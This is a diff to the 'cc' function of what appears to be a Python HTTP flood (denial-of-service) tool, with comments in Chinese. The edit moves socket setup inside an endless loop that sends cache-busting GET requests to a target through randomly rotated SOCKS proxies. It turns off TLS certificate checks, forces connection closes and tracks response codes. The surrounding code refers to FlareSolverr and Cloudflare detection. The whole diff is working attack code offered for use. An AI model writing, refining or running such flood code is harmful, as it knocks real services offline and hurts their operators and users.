@@ -599,7 +599,7 @@ def InputOption(question,options,default):
 			continue
 	return ans
 
-def cc(event,proxy_type):
+def cc(event, proxy_type):
     global USE_FLARESOLVERR, url, request_count
     header = GenReqHeader("get")
     proxy = Choice(proxies).strip().split(":")
@@ -608,10 +608,9 @@ def cc(event,proxy_type):
         add = "&"
     event.wait()
     
-    error_count = 0
-    max_errors = 50  # 连续错误50次后打印一次警告
-    
     while True:
+        # 1. 把 socket 创建和连接的逻辑移到循环内部
+        s = None  # 确保 s 被定义
         try:
             s = socks.socksocket()
             if proxy_type == 4:
@@ -632,36 +631,36 @@ def cc(event,proxy_type):
                 ctx.check_hostname = False
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
+
+            # 2. 发送请求并立即处理响应，然后关闭连接
+            get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
+            # 3. 确保使用 Connection: close 来避免混淆
+            request = get_host + header.replace("Connection: Keep-Alive", "Connection: close") 
+            s.send(str.encode(request))
             
-            # 连接成功，重置错误计数
-            error_count = 0
+            # 使用简化的统计，因为我们现在每次只发一个请求
+            # 这里可以简化，直接接收并解析，因为我们知道连接会关闭
+            response_data = s.recv(4096) # 可以读多一点数据
+            status_code = parse_response(response_data)
             
-            try:
-                for i in range(100):
-                    get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
-                    request = get_host + header
-                    sent = s.send(str.encode(request))
-                    
-                    if not sent:
-                        proxy = Choice(proxies).strip().split(":")
-                        break
-                    
-                    new_header = handle_response_with_cf_detection(s, GenReqHeader, "get")
-                    if new_header:
-                        header = new_header
-                        
-                s.close()
-            except:
-                s.close()
-                
-        except:
+            # 使用你现有的统计函数
+            if status_code:
+                update_stats_simple(status_code=status_code)
+            else:
+                debug_info = response_data[:100].decode('utf-8', errors='ignore') if DEBUG_MODE else None
+                update_stats_simple(is_error=True, error_type="PARSE_FAILED", debug_info=debug_info)
+
+            # 4. 手动关闭 socket
             s.close()
-            proxy = Choice(proxies).strip().split(":")
-            error_count += 1
             
-            # 每50次连续错误打印一次警告
-            if error_count % max_errors == 0:
-                print(f"[WARNING] 线程连续失败 {error_count} 次，当前代理: {proxy[0]}:{proxy[1]}")
+        except Exception as e:
+            if s:
+                s.close()
+            # 当连接失败时，更换代理并重试
+            proxy = Choice(proxies).strip().split(":")
+            debug_info = str(e) if DEBUG_MODE else None
+            update_stats_simple(is_error=True, error_type="CONNECTION_ERROR", debug_info=debug_info)
+
 
 def head(event,proxy_type):
 	global USE_FLARESOLVERR, url, request_count  # ⚠️ 添加这行
